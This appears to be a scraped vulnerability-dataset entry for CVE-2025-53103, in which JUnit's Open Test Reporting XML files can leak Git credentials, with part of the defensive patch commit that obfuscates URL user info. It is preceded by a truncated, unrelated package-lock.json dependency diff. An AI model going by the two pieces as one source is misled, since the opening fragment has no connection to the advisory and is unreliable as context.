-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-primitive": {
-      "version": "2.1.3",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-primitive/-/react-primitive-2.1.3.tgz",
-      "integrity": "sha512-m9gTwRkhy2lvCPe6QJp4d3G1TYEUHn/FzJUtq9MjH46an1wJU+GdoGC5VLof8RX8Ft/DlpshApkhswDLZzHIcQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-slot": "1.2.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-roving-focus": {
-      "version": "1.1.10",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-roving-focus/-/react-roving-focus-1.1.10.tgz",
-      "integrity": "sha512-dT9aOXUen9JSsxnMPv/0VqySQf5eDQ6LCk5Sw28kamz8wSOW2bJdlX2Bg5VUIIcV+6XlHpWTIuTPCf/UNIyq8Q==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-collection": "1.1.7",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-direction": "1.1.1",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1",
-        "@radix-ui/react-use-controllable-state": "1.2.2"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-select": {
-      "version": "2.2.5",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-select/-/react-select-2.2.5.tgz",
-      "integrity": "sha512-HnMTdXEVuuyzx63ME0ut4+sEMYW6oouHWNGUZc7ddvUWIcfCva/AMoqEW/3wnEllriMWBa0RHspCYnfCWJQYmA==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/number": "1.1.1",
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-collection": "1.1.7",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-direction": "1.1.1",
-        "@radix-ui/react-dismissable-layer": "1.1.10",
-        "@radix-ui/react-focus-guards": "1.1.2",
-        "@radix-ui/react-focus-scope": "1.1.7",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-popper": "1.2.7",
-        "@radix-ui/react-portal": "1.1.9",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-slot": "1.2.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "@radix-ui/react-use-layout-effect": "1.1.1",
-        "@radix-ui/react-use-previous": "1.1.1",
-        "@radix-ui/react-visually-hidden": "1.2.3",
-        "aria-hidden": "^1.2.4",
-        "react-remove-scroll": "^2.6.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-slot": {
-      "version": "1.2.3",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-slot/-/react-slot-1.2.3.tgz",
-      "integrity": "sha512-aeNmHnBxbi2St0au6VBVC7JXFlhLlOnvIIlePNniyUNAClzmtAUEY8/pBiK3iHjufOlwA+c20/8jngo7xcrg8A==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-compose-refs": "1.1.2"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-tabs": {
-      "version": "1.1.12",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-tabs/-/react-tabs-1.1.12.tgz",
-      "integrity": "sha512-GTVAlRVrQrSw3cEARM0nAx73ixrWDPNZAruETn3oHCNP6SbZ/hNxdxp+u7VkIEv3/sFoLq1PfcHrl7Pnp0CDpw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-direction": "1.1.1",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-roving-focus": "1.1.10",
-        "@radix-ui/react-use-controllable-state": "1.2.2"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-toast": {
-      "version": "1.2.14",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-toast/-/react-toast-1.2.14.tgz",
-      "integrity": "sha512-nAP5FBxBJGQ/YfUB+r+O6USFVkWq3gAInkxyEnmvEV5jtSbfDhfa4hwX8CraCnbjMLsE7XSf/K75l9xXY7joWg==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-collection": "1.1.7",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-dismissable-layer": "1.1.10",
-        "@radix-ui/react-portal": "1.1.9",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-use-callback-ref": "1.1.1",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "@radix-ui/react-use-layout-effect": "1.1.1",
-        "@radix-ui/react-visually-hidden": "1.2.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-tooltip": {
-      "version": "1.2.7",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-tooltip/-/react-tooltip-1.2.7.tgz",
-      "integrity": "sha512-Ap+fNYwKTYJ9pzqW+Xe2HtMRbQ/EeWkj2qykZ6SuEV4iS/o1bZI5ssJbk4D2r8XuDuOBVz/tIx2JObtuqU+5Zw==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/primitive": "1.1.2",
-        "@radix-ui/react-compose-refs": "1.1.2",
-        "@radix-ui/react-context": "1.1.2",
-        "@radix-ui/react-dismissable-layer": "1.1.10",
-        "@radix-ui/react-id": "1.1.1",
-        "@radix-ui/react-popper": "1.2.7",
-        "@radix-ui/react-portal": "1.1.9",
-        "@radix-ui/react-presence": "1.1.4",
-        "@radix-ui/react-primitive": "2.1.3",
-        "@radix-ui/react-slot": "1.2.3",
-        "@radix-ui/react-use-controllable-state": "1.2.2",
-        "@radix-ui/react-visually-hidden": "1.2.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-callback-ref": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-callback-ref/-/react-use-callback-ref-1.1.1.tgz",
-      "integrity": "sha512-FkBMwD+qbGQeMu1cOHnuGB6x4yzPjho8ap5WtbEJ26umhgqVXbhekKUQO+hZEL1vU92a3wHwdp0HAcqAUF5iDg==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-controllable-state": {
-      "version": "1.2.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-controllable-state/-/react-use-controllable-state-1.2.2.tgz",
-      "integrity": "sha512-BjasUjixPFdS+NKkypcyyN5Pmg83Olst0+c6vGov0diwTEo6mgdqVR6hxcEgFuh4QrAs7Rc+9KuGJ9TVCj0Zzg==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-use-effect-event": "0.0.2",
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-effect-event": {
-      "version": "0.0.2",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-effect-event/-/react-use-effect-event-0.0.2.tgz",
-      "integrity": "sha512-Qp8WbZOBe+blgpuUT+lw2xheLP8q0oatc9UpmiemEICxGvFLYmHm9QowVZGHtJlGbS6A6yJ3iViad/2cVjnOiA==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-escape-keydown": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-escape-keydown/-/react-use-escape-keydown-1.1.1.tgz",
-      "integrity": "sha512-Il0+boE7w/XebUHyBjroE+DbByORGR9KKmITzbR7MyQ4akpORYP/ZmbhAr0DG7RmmBqoOnZdy2QlvajJ2QA59g==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-use-callback-ref": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-layout-effect": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-layout-effect/-/react-use-layout-effect-1.1.1.tgz",
-      "integrity": "sha512-RbJRS4UWQFkzHTTwVymMTUv8EqYhOp8dOOviLj2ugtTiXRaRQS7GLGxZTLL1jWhMeoSCf5zmcZkqTl9IiYfXcQ==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-previous": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-previous/-/react-use-previous-1.1.1.tgz",
-      "integrity": "sha512-2dHfToCj/pzca2Ck724OZ5L0EVrr3eHRNsG/b3xQJLA2hZpVCS99bLAX+hm1IHXDEnzU6by5z/5MIY794/a8NQ==",
-      "license": "MIT",
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-rect": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-rect/-/react-use-rect-1.1.1.tgz",
-      "integrity": "sha512-QTYuDesS0VtuHNNvMh+CjlKJ4LJickCMUAqjlE3+j8w+RlRpwyX3apEQKGFzbZGdo7XNG1tXa+bQqIE7HIXT2w==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/rect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-use-size": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-use-size/-/react-use-size-1.1.1.tgz",
-      "integrity": "sha512-ewrXRDTAqAXlkl6t/fkXWNAhFX9I+CkKlw6zjEwk86RSPKwZr3xpBRso655aqYafwtnbpHLj6toFzmd6xdVptQ==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-use-layout-effect": "1.1.1"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/react-visually-hidden": {
-      "version": "1.2.3",
-      "resolved": "https://registry.npmjs.org/@radix-ui/react-visually-hidden/-/react-visually-hidden-1.2.3.tgz",
-      "integrity": "sha512-pzJq12tEaaIhqjbzpCuv/OypJY/BPavOofm+dbab+MHLajy277+1lLm6JFcGgF5eskJ6mquGirhXY2GD/8u8Ug==",
-      "license": "MIT",
-      "dependencies": {
-        "@radix-ui/react-primitive": "2.1.3"
-      },
-      "peerDependencies": {
-        "@types/react": "*",
-        "@types/react-dom": "*",
-        "react": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc",
-        "react-dom": "^16.8 || ^17.0 || ^18.0 || ^19.0 || ^19.0.0-rc"
-      },
-      "peerDependenciesMeta": {
-        "@types/react": {
-          "optional": true
-        },
-        "@types/react-dom": {
-          "optional": true
-        }
-      }
-    },
-    "node_modules/@radix-ui/rect": {
-      "version": "1.1.1",
-      "resolved": "https://registry.npmjs.org/@radix-ui/rect/-/rect-1.1.1.tgz",
-      "integrity": "sha512-HPwpGIzkl28mWyZqG52jiqDJ12waP11Pa1lGoiyUkIEuMLBP0oeK/C89esbXrxsky5we7dfd8U58nm0SgAWpVw==",
-      "license": "MIT"
-    },
     "node_modules/@shikijs/engine-oniguruma": {
       "version": "3.6.0",
       "resolved": "https://registry.npmjs.org/@shikijs/engine-oniguruma/-/engine-oniguruma-3.6.0.tgz",
@@ -1147,66 +222,20 @@
     "node_modules/@tsconfig/node12": {
       "version": "1.0.11",
       "resolved": "https://registry.npmjs.org/@tsconfig/node12/-/node12-1.0.11.tgz",
-      "integrity": "sha512-cqefuRsh12pWyGsIoBKJA9luFu3mRxCA+ORZvA4ktLSzIuCUtWVxGIuXigEwO5/ywWFMZ2QEGKWvkZG1zDMTag==",
-      "license": "MIT"
-    },
-    "node_modules/@tsconfig/node14": {
-      "version": "1.0.3",
-      "resolved": "https://registry.npmjs.org/@tsconfig/node14/-/node14-1.0.3.tgz",
-      "integrity": "sha512-ysT8mhdixWK6Hw3i1V2AeRqZ5WfXg1G43mqoYlM2nc6388Fq5jcXyr5mRsqViLx/GJYdoL0bfXD8nmF+Zn/Iow==",
-      "license": "MIT"
-    },
-    "node_modules/@tsconfig/node16": {
-      "version": "1.0.4",
-      "resolved": "https://registry.npmjs.org/@tsconfig/node16/-/node16-1.0.4.tgz",
-      "integrity": "sha512-vxhUy4J8lyeyinH7Azl1pdd43GJhZH/tP2weN8TntQblOY+A0XbT8DJk1/oCPuOOyg/Ja757rG0CgHcWC8OfMA==",
-      "license": "MIT"
-    },
-    "node_modules/@types/body-parser": {
-      "version": "1.19.5",
-      "resolved": "https://registry.npmjs.org/@types/body-parser/-/body-parser-1.19.5.tgz",
-      "integrity": "sha512-fB3Zu92ucau0iQ0JMCFQE7b/dv8Ot07NI3KaZIkIUNXq82k4eBAqUaneXfleGY9JWskeS9y+u0nXMyspcuQrCg==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/connect": "*",
-        "@types/node": "*"
-      }
-    },
-    "node_modules/@types/connect": {
-      "version": "3.4.38",
-      "resolved": "https://registry.npmjs.org/@types/connect/-/connect-3.4.38.tgz",
-      "integrity": "sha512-K6uROf1LD88uDQqJCktA4yzL1YYAK6NgfsI0v/mTgyPKWsX1CnJ0XPSDhViejru1GcRkLWb8RlzFYJRqGUbaug==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/node": "*"
-      }
-    },
-    "node_modules/@types/express": {
-      "version": "5.0.3",
-      "resolved": "https://registry.npmjs.org/@types/express/-/express-5.0.3.tgz",
-      "integrity": "sha512-wGA0NX93b19/dZC1J18tKWVIYWyyF2ZjT9vin/NRu0qzzvfVzWjs04iq2rQ3H65vCTQYlRqs3YHfY7zjdV+9Kw==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/body-parser": "*",
-        "@types/express-serve-static-core": "^5.0.0",
-        "@types/serve-static": "*"
-      }
+      "integrity": "sha512-cqefuRsh12pWyGsIoBKJA9luFu3mRxCA+ORZvA4ktLSzIuCUtWVxGIuXigEwO5/ywWFMZ2QEGKWvkZG1zDMTag==",
+      "license": "MIT"
     },
-    "node_modules/@types/express-serve-static-core": {
-      "version": "5.0.6",
-      "resolved": "https://registry.npmjs.org/@types/express-serve-static-core/-/express-serve-static-core-5.0.6.tgz",
-      "integrity": "sha512-3xhRnjJPkULekpSzgtoNYYcTWgEZkp4myc+Saevii5JPnHNvHMRlBSHDbs7Bh1iPPoVTERHEZXyhyLbMEsExsA==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/node": "*",
-        "@types/qs": "*",
-        "@types/range-parser": "*",
-        "@types/send": "*"
-      }
+    "node_modules/@tsconfig/node14": {
+      "version": "1.0.3",
+      "resolved": "https://registry.npmjs.org/@tsconfig/node14/-/node14-1.0.3.tgz",
+      "integrity": "sha512-ysT8mhdixWK6Hw3i1V2AeRqZ5WfXg1G43mqoYlM2nc6388Fq5jcXyr5mRsqViLx/GJYdoL0bfXD8nmF+Zn/Iow==",
+      "license": "MIT"
+    },
+    "node_modules/@tsconfig/node16": {
+      "version": "1.0.4",
+      "resolved": "https://registry.npmjs.org/@tsconfig/node16/-/node16-1.0.4.tgz",
+      "integrity": "sha512-vxhUy4J8lyeyinH7Azl1pdd43GJhZH/tP2weN8TntQblOY+A0XbT8DJk1/oCPuOOyg/Ja757rG0CgHcWC8OfMA==",
+      "license": "MIT"
     },
     "node_modules/@types/hast": {
       "version": "3.0.4",
@@ -1218,43 +247,6 @@
         "@types/unist": "*"
       }
     },
-    "node_modules/@types/http-errors": {
-      "version": "2.0.4",
-      "resolved": "https://registry.npmjs.org/@types/http-errors/-/http-errors-2.0.4.tgz",
-      "integrity": "sha512-D0CFMMtydbJAegzOyHjtiKPLlvnm3iTZyZRSZoLq2mRhDdmLfIWOCYPfQJ4cu2erKghU++QvjcUjp/5h7hESpA==",
-      "dev": true,
-      "license": "MIT"
-    },
-    "node_modules/@types/js-yaml": {
-      "version": "4.0.9",
-      "resolved": "https://registry.npmjs.org/@types/js-yaml/-/js-yaml-4.0.9.tgz",
-      "integrity": "sha512-k4MGaQl5TGo/iipqb2UDG2UwjXziSWkh0uysQelTlJpX1qGlpUZYm8PnO4DxG1qBomtJUdYJ6qR6xdIah10JLg==",
-      "dev": true,
-      "license": "MIT"
-    },
-    "node_modules/@types/jsonwebtoken": {
-      "version": "9.0.10",
-      "resolved": "https://registry.npmjs.org/@types/jsonwebtoken/-/jsonwebtoken-9.0.10.tgz",
-      "integrity": "sha512-asx5hIG9Qmf/1oStypjanR7iKTv0gXQ1Ov/jfrX6kS/EO0OFni8orbmGCn0672NHR3kXHwpAwR+B368ZGN/2rA==",
-      "license": "MIT",
-      "dependencies": {
-        "@types/ms": "*",
-        "@types/node": "*"
-      }
-    },
-    "node_modules/@types/mime": {
-      "version": "1.3.5",
-      "resolved": "https://registry.npmjs.org/@types/mime/-/mime-1.3.5.tgz",
-      "integrity": "sha512-/pyBZWSLD2n0dcHE3hq8s8ZvcETHtEuF+3E7XVt0Ig2nvsVQXdghHVcEkIWjy9A0wKfTn97a/PSDYohKIlnP/w==",
-      "dev": true,
-      "license": "MIT"
-    },
-    "node_modules/@types/ms": {
-      "version": "2.1.0",
-      "resolved": "https://registry.npmjs.org/@types/ms/-/ms-2.1.0.tgz",
-      "integrity": "sha512-GsCCIZDE/p3i96vtEqx+7dBUGXrc7zeSK3wwPHIaRThS+9OhWIXRqzs4d6k1SVU8g91DrNRWxWUGhp5KXQb2VA==",
-      "license": "MIT"
-    },
     "node_modules/@types/node": {
       "version": "24.0.3",
       "resolved": "https://registry.npmjs.org/@types/node/-/node-24.0.3.tgz",
@@ -1264,20 +256,6 @@
         "undici-types": "~7.8.0"
       }
     },
-    "node_modules/@types/qs": {
-      "version": "6.14.0",
-      "resolved": "https://registry.npmjs.org/@types/qs/-/qs-6.14.0.tgz",
-      "integrity": "sha512-eOunJqu0K1923aExK6y8p6fsihYEn/BYuQ4g0CxAAgFc4b/ZLN4CrsRZ55srTdqoiLzU2B2evC+apEIxprEzkQ==",
-      "dev": true,
-      "license": "MIT"
-    },
-    "node_modules/@types/range-parser": {
-      "version": "1.2.7",
-      "resolved": "https://registry.npmjs.org/@types/range-parser/-/range-parser-1.2.7.tgz",
-      "integrity": "sha512-hKormJbkJqzQGhziax5PItDUTMAM9uE2XXQmM37dyd4hVM+5aVl7oVxMVUiVQn2oCQFN/LKCZdvSM0pFRqbSmQ==",
-      "dev": true,
-      "license": "MIT"
-    },
     "node_modules/@types/sanitize-html": {
       "version": "2.16.0",
       "resolved": "https://registry.npmjs.org/@types/sanitize-html/-/sanitize-html-2.16.0.tgz",
@@ -1287,29 +265,6 @@
         "htmlparser2": "^8.0.0"
       }
     },
-    "node_modules/@types/send": {
-      "version": "0.17.4",
-      "resolved": "https://registry.npmjs.org/@types/send/-/send-0.17.4.tgz",
-      "integrity": "sha512-x2EM6TJOybec7c52BX0ZspPodMsQUd5L6PRwOunVyVUhXiBSKf3AezDL8Dgvgt5o0UfKNfuA0eMLr2wLT4AiBA==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/mime": "^1",
-        "@types/node": "*"
-      }
-    },
-    "node_modules/@types/serve-static": {
-      "version": "1.15.7",
-      "resolved": "https://registry.npmjs.org/@types/serve-static/-/serve-static-1.15.7.tgz",
-      "integrity": "sha512-W8Ym+h8nhuRwaKPaDw34QUkwsGi6Rc4yYqvKFo5rm2FUEhCFbzVWrxXUxuKK8TASjWsysJY0nsmNCGhCOIsrOw==",
-      "dev": true,
-      "license": "MIT",
-      "dependencies": {
-        "@types/http-errors": "*",
-        "@types/node": "*",
-        "@types/send": "*"
-      }
-    },
     "node_modules/@types/triple-beam": {
       "version": "1.3.5",
       "resolved": "https://registry.npmjs.org/@types/triple-beam/-/triple-beam-1.3.5.tgz",
@@ -1382,33 +337,6 @@
         "url": "https://github.com/sponsors/epoberezkin"
       }
     },
-    "node_modules/ansi-regex": {
-      "version": "6.1.0",
-      "resolved": "https://registry.npmjs.org/ansi-regex/-/ansi-regex-6.1.0.tgz",
-      "integrity": "sha512-7HSX4QQb4CspciLpVFwyRe79O3xsIZDDLER21kERQ71oaPodF8jL725AgJMFAYbooIqolJoRLuM81SpeUkpkvA==",
-      "license": "MIT",
-      "engines": {
-        "node": ">=12"
-      },
-      "funding": {
-        "url": "https://github.com/chalk/ansi-regex?sponsor=1"
-      }
-    },
-    "node_modules/ansi-styles": {
-      "version": "4.3.0",
-      "resolved": "https://registry.npmjs.org/ansi-styles/-/ansi-styles-4.3.0.tgz",
-      "integrity": "sha512-zbB9rCJAT1rbjiVDb2hqKFHNYLxgtk8NURxZ3IZwD3F6NtxbXZQCnnSi1Lkx+IDohdPlFp222wVALIheZJQSEg==",
-      "license": "MIT",
-      "dependencies": {
-        "color-convert": "^2.0.1"
-      },
-      "engines": {
-        "node": ">=8"
-      },
-      "funding": {
-        "url": "https://github.com/chalk/ansi-styles?sponsor=1"
-      }
-    },
     "node_modules/arg": {
       "version": "4.1.3",
       "resolved": "https://registry.npmjs.org/arg/-/arg-4.1.3.tgz",
@@ -1422,18 +350,6 @@
       "dev": true,
       "license": "Python-2.0"
     },
-    "node_modules/aria-hidden": {
-      "version": "1.2.6",
-      "resolved": "https://registry.npmjs.org/aria-hidden/-/aria-hidden-1.2.6.tgz",
-      "integrity": "sha512-ik3ZgC9dY/lYVVM++OISsaYDeg1tb0VtP5uL3ouh1koGOaUMDPpbFIei4JkFimWUFPn90sbMNMXQAIVOlnYKJA==",
-      "licen
... [truncated]

================================================================================


CVE ID: CVE-2025-53103
Published: 2025-07-01T18:15:25.837
Modified: 2025-07-03T15:14:12.767
CVSS Score: 5.8 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-312: Cleartext Storage of Sensitive Information

Description:
JUnit is a testing framework for Java and the JVM. From version 5.12.0 to 5.13.1, JUnit's support for writing Open Test Reporting XML files can leak Git credentials. The impact depends on the level of the access token exposed through the OpenTestReportGeneratingListener. If these test reports are published or stored anywhere public, then there is the possibility that a rouge attacker can steal the token and perform elevated actions by impersonating the user or app. This issue as been patched in version 5.13.2.

References (2):
  1. https://github.com/junit-team/junit-framework/commit/d4fc834c8c1c0b3168cd030c13551d1d041f51bc
  2. https://github.com/junit-team/junit-framework/security/advisories/GHSA-m43g-m425-p68x

Attempting to extract code examples from references...

--- Code from https://github.com/junit-team/junit-framework/commit/d4fc834c8c1c0b3168cd030c13551d1d041f51bc ---
From d4fc834c8c1c0b3168cd030c13551d1d041f51bc Mon Sep 17 00:00:00 2001
From: Marc Philipp <mail@marcphilipp.de>
Date: Tue, 24 Jun 2025 12:30:37 +0200
Subject: [PATCH] Merge commit from fork

* Obfuscate user info in Git remote URLs

* Move Git info code to separate class

* Make including Git repo info an opt-in feature

Issue: ota4j-team/open-test-reporting#501
(cherry picked from commit 1aac518f3b5ef8b3967fda13f5c35d2b155cefad)
---
 documentation/documentation.gradle.kts        |   1 +
 .../release-notes/release-notes-5.13.2.adoc   |   6 +-
 .../junit-platform-reporting.adoc             |   6 +-
 .../junitbuild.testing-conventions.gradle.kts |   1 +
 .../reporting/open/xml/GitInfoCollector.java  | 209 ++++++++++++++++++
 .../xml/OpenTestReportGeneratingListener.java | 115 ++--------
 ...OpenTestReportGeneratingListenerTests.java |  87 ++++++--
 7 files changed, 313 insertions(+), 112 deletions(-)
 create mode 100644 junit-platform-reporting/src/main/java/org/junit/platform/reporting/open/xml/GitInfoCollector.java

diff --git a/documentation/documentation.gradle.kts b/documentation/documentation.gradle.kts
index f6f5552ec9f6..632ba305cec9 100644
--- a/documentation/documentation.gradle.kts
+++ b/documentation/documentation.gradle.kts
@@ -161,6 +161,7 @@ tasks {
 		args.addAll("execute")
 		args.addAll("--scan-classpath")
 		args.addAll("--config=junit.platform.reporting.open.xml.enabled=true")
+		args.addAll("--config=junit.platform.reporting.open.xml.git.enabled=true")
 		args.addAll("--config=junit.platform.output.capture.stdout=true")
 		args.addAll("--config=junit.platform.output.capture.stderr=true")
 		args.addAll("--config=junit.platform.discovery.issue.severity.critical=info")
diff --git a/documentation/src/docs/asciidoc/release-notes/release-notes-5.13.2.adoc b/documentation/src/docs/asciidoc/release-notes/release-notes-5.13.2.adoc
index 44f492f3e732..01ab419097ee 100644
--- a/documentation/src/docs/asciidoc/release-notes/release-notes-5.13.2.adoc
+++ b/documentation/src/docs/asciidoc/release-notes/release-notes-5.13.2.adoc
@@ -21,7 +21,11 @@ repository on GitHub.
 [[release-notes-5.13.2-junit-platform-deprecations-and-breaking-changes]]
 ==== Deprecations and Breaking Changes
 
-* ❓
+* Including information about the Git repository (such as the commit hash and branch name)
+  in the Open Test Reporting XML format is now an opt-in feature that can be enabled via a
+  configuration parameter. Please refer to the
+  <<../user-guide/index.adoc#junit-platform-reporting-open-test-reporting, User Guide>>
+  for details.
 
 [[release-notes-5.13.2-junit-platform-new-features-and-improvements]]
 ==== New Features and Improvements
